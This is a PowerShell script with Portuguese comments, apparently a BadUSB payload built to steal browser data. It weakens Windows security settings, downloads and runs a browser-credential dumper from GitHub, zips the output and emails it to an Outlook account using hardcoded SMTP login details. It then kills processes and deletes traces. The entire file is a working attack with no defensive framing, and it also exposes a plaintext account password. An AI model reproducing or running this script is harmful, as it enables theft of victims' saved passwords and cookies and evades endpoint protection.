

# Desabilitar a execução de scripts (para todos os usuários)
Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Unrestricted -Force

# Desabilitar a Proteção de Execução do Windows Defender
Set-MpPreference -EnableControlledFolderAccess Disabled

# Verificando se o diretório de destino existe e criando-o, se necessário
$destinationPath = "$env:appdata\dump"
if (-not (Test-Path $destinationPath)) {
    New-Item -Path $destinationPath -ItemType Directory | Out-Null
}

# Definindo o diretório correto como local de trabalho
Set-Location $destinationPath

# Baixando e executando o arquivo hackbrowser.exe
Invoke-WebRequest -Uri "https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe" -OutFile "hb.exe"

# Executando o arquivo hb.exe
Start-Process -FilePath "hb.exe"

# Aguardando um momento para a execução do arquivo
Start-Sleep -Seconds 5

# Removendo o arquivo hb.exe
Remove-Item -Path "hb.exe" -Force

# Criando um arquivo compactado ZIP
$sourcePath = Get-Location
$zipFileName = "dump+" + $env:USERNAME + ".zip"
$zipPath = Join-Path -Path $env:appdata -ChildPath $zipFileName
Compress-Archive -Path $sourcePath -DestinationPath $zipPath -Force

# Definindo as informações de autenticação para envio de e-mail
$SMTPServer = "smtp.office365.com"
$SMTPPort = 587
$SMTPUsername = "williamattiny@outlook.com"
$SMTPPassword = "dkctcyeducrzaewc"

# Criando a mensagem de e-mail
$From = "williamattiny@outlook.com"
$To = "williamattiny@outlook.com"
$Subject = "Arquivo compactado"
$Body = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"

# Criando o objeto de e-mail
$EmailMessage = New-Object System.Net.Mail.MailMessage
$EmailMessage.From = $From
$EmailMessage.To.Add($To)
$EmailMessage.Subject = $Subject
$EmailMessage.Body = $Body

# Anexando o arquivo ZIP
$Attachment = New-Object System.Net.Mail.Attachment($zipPath)
$EmailMessage.Attachments.Add($Attachment)

# Configurando o cliente SMTP
$SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SMTPUsername, $SMTPPassword)

# Enviando o e-mail
$SMTPClient.Send($EmailMessage)

# Aguardando um momento após o envio do e-mail
Start-Sleep -Seconds 5

# Tentando encerrar processos novamente usando o comando taskkill
Get-Process | Where-Object { $_.Path -like "$destinationPath\*" } | ForEach-Object { taskkill /F /PID $_.Id }

# Aguardando um momento para garantir que os processos sejam encerrados
Start-Sleep -Seconds 2

# Removendo o diretório e o arquivo compactado
$nomeUsuario = $env:USERNAME
$caminhoPasta = "C:\Users\$nomeUsuario\AppData\Roaming\dump\results"
if (Test-Path $caminhoPasta -PathType Container) { Remove-Item $caminhoPasta -Recurse -Force }

# Removendo o caminho de exclusão do Windows Defender
Remove-MpPreference -ExclusionPath $destinationPath

# Sair do PowerShell
exit
